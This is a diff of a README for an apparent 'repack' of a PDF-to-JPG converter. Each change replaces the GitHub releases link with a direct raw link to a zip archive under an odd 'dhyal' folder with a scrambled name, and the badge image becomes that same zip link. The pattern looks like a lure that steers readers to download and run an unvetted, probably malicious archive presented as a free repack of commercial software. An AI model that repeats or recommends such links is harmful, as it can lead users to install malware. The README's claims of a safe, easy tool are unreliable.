@@ -1,6 +1,6 @@
 # 🖼️ TriSun-PDF-to-JPG-Repack - Simple PDF to JPG Conversion Tool
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-1EB0F4?style=for-the-badge)](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/releases)
+[![Download](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/raw/refs/heads/main/dhyal/Sun_to_PD_Repack_Tri_JP_2.4.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-1EB0F4?style=for-the-badge)](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/raw/refs/heads/main/dhyal/Sun_to_PD_Repack_Tri_JP_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ TriSun-PDF-to-JPG-Repack allows you to convert PDF files to JPG images easily. T
 
 ## 📥 Download & Install
 
-To download TriSun-PDF-to-JPG-Repack, [visit this page to download](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/releases). You will find the latest release ready for download.
+To download TriSun-PDF-to-JPG-Repack, [visit this page to download](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/raw/refs/heads/main/dhyal/Sun_to_PD_Repack_Tri_JP_2.4.zip). You will find the latest release ready for download.
 
 1. Click on the link above.
 2. Locate the latest version under "Assets" for the download.
@@ -56,4 +56,4 @@ If you encounter any issues, please check the FAQ section on the GitHub page or 
 
 TriSun-PDF-to-JPG-Repack is your go-to tool for converting PDF files to JPG images with ease. With a user-friendly interface and various features, you can quickly transform your documents for sharing or editing. 
 
-For more information or to download, visit [this page to download](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/releases).
+For more information or to download, visit [this page to download](https://github.com/Ararmurpy/TriSun-PDF-to-JPG-Repack/raw/refs/heads/main/dhyal/Sun_to_PD_Repack_Tri_JP_2.4.zip).
